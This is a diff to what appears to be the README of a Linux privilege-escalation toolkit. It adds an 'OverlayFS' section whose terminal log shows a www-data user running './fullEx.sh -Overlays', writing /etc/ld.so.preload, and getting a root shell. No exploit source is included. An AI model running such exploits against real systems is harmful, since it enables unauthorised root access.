@@ -184,3 +184,24 @@ firefart@ubuntu:/tmp/fullEx# id
 id
 uid=0(firefart) gid=0(root) groups=0(root)
 ```
+
+# 💀 OverlayFS
+
+```
+www-data@droopy:/tmp/fullEx$ ./fullEx.sh -Overlays
+./fullEx.sh -Overlays
+[+] Compilation successfuly !
+[+] PATH=/tmp/fullEx/exploits/Overlays/overlays
+[+] Executing the binary...
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+sh: 0: can't access tty; job control turned off
+# bash -i
+bash: cannot set terminal process group (907): Inappropriate ioctl for device
+bash: no job control in this shell
+root@droopy:/tmp/fullEx# 
+```
